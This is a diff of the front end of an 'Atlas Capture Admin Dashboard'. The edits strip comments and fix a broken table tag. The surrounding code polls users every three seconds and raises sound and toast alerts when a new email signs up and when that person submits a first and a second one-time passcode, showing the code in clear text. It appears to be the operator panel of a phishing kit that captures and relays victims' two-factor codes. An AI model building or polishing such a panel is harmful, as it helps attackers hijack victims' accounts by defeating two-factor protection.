@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Atlas Capture Admin Dashboard</title>
     
-    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     
@@ -608,7 +607,6 @@
         silentAudio.play().then(() => {
             audioUnlocked = true;
             console.log('Audio unlocked');
-            // Remove activation banner if exists
             const banner = document.getElementById('audioBanner');
             if (banner) banner.remove();
         }).catch(e => {
@@ -639,15 +637,12 @@
     function playSound(type) {
         if (!soundEnabled) return;
         
-        // Try to unlock on first play attempt
         if (!audioUnlocked) {
             showAudioActivationBanner();
             return;
         }
         
         const sound = type === 'signup' ? signupSound : otpSound;
-        
-        // Reset and play
         sound.currentTime = 0;
         const playPromise = sound.play();
         
@@ -699,7 +694,6 @@
         setTimeout(() => toast.remove(), 2000);
     }
 
-    // Format date without AM/PM
     function formatDate(dateString) { 
         const date = new Date(dateString); 
         const year = date.getFullYear();
@@ -775,7 +769,7 @@
             
             if (!previous) {
                 if (!user.otp1_never) {
-                    playSound('signup');  // Play signup sound
+                    playSound('signup');
                     showToast('New Signup', `${user.email} signed up`);
                     const card = document.getElementById('pendingEmailCard');
                     card.classList.add('has-new');
@@ -783,7 +777,7 @@
                 }
             } else {
                 if (!previous.otp && user.otp && !user.otp1_never) {
-                    playSound('otp');  // Play OTP sound
+                    playSound('otp');
                     showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
                     const card = document.getElementById('pendingFirstCard');
                     card.classList.add('has-new');
@@ -791,7 +785,7 @@
                 }
                 
                 if (!previous.second_otp && user.second_otp && !user.otp1_never) {
-                    playSound('otp');  // Play OTP sound for second OTP too
+                    playSound('otp');
                     showToast('Second OTP', `${user.email} submitted second OTP`);
                     const card = document.getElementById('pendingSecondCard');
                     card.classList.add('has-new');
@@ -849,7 +843,7 @@
 
     function displayUsers(users) {
         const tbody = document.getElementById('usersTableBody');
-        if (!users.length) { tbody.innerHTML = '<tr><td colspan="6" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div></tr></tr>'; return; }
+        if (!users.length) { tbody.innerHTML = '<tr><td colspan="6" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div></td></tr>'; return; }
         
         tbody.innerHTML = users.map(user => {
             let statusBadge = '';
@@ -930,21 +924,17 @@
         btn.onclick = () => { document.body.classList.toggle('dark-mode'); localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); };
     }
 
-    // Request notification permission
     if (Notification.permission === 'default') Notification.requestPermission();
     
-    // Initialize
     setupTheme();
     fetchUsers();
     setInterval(fetchUsers, 3000);
     
-    // Try to unlock audio on first user interaction
     document.addEventListener('click', function onClick() {
         unlockAudio();
         document.removeEventListener('click', onClick);
     }, { once: true });
     
-    // Button handlers
     document.getElementById('soundToggleBtn').onclick = toggleSound;
     document.getElementById('logoutBtn').onclick = () => { localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; };
 </script>
